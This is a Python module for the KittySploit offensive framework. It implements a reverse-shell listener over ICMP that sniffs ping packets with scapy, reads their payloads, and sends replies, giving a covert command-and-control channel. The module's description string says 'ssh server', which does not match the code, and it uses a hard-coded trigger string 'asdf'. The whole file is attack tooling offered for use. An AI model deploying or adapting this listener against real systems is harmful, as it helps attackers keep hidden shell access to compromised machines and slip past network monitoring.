from kittysploit import *
from scapy.all import IP, ICMP, sniff, send, Raw
import sys
class Module(Listener):

    __info__ = {
        "name": "Create ICMP listener",
        "description": "Connect to ssh server and spawn a command shell",
        "module": "listeners/multi/reverse_icmp",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL
    }

    lhost = OptString("0.0.0.0", "Target IPv4 or IPv6 address", True)

    def run(self):
        print_success("Starting ICMP listener...")
        server = ReverseICMPServer(self.lhost)
        print_success("ICMP listener started")
        while True:
            try:
                message = server.recv()
                print_info("Message received")
                print_info(message)
                if message:
                    if message == "asdf":
                        print_info(server)
                        return server
                    elif message == "Fail":
                        break
            except KeyboardInterrupt:
                print_info("Interrupted by user. Exiting...")
                break

class ReverseICMPServer:

    def __init__(self, listen_ip):
        self.listen_ip = listen_ip
        self.client_ip = None
        self.received_message = None

    def recv(self, data_bytes=None):
        def handle_packet(packet):
            print_status("Packet received")
            if ICMP in packet and packet[ICMP].type == 8:  # ICMP Echo Request (ping)
                print_info("here")
                self.received_message = packet[Raw].load.decode()
                self.client_ip = packet[IP].src
                print_info(f"Received message from {self.client_ip}: {self.received_message}")
                if self.received_message == "asdf":
                    return "asdf"
        try:
            print_success("Starting packet sniffing...")
            sniff(filter="icmp", prn=handle_packet, count=1)
            return self.received_message
        except KeyboardInterrupt:
            return "Fail"
        except PermissionError:
            print_error("Permission denied: You need to run this script as root.")
            return "Fail"
        except Exception as e:
            print_error(f"An unexpected error occurred: {e}")
            return "Fail"

    def send(self, response_message):
        if self.client_ip:
            response = IP(dst=self.client_ip)/ICMP(type=0)/Raw(load=response_message)
            send(response)
            print_info(f"Sent response to {self.client_ip}: {response_message}")
        else:
            print_error("No client IP to send the response to.")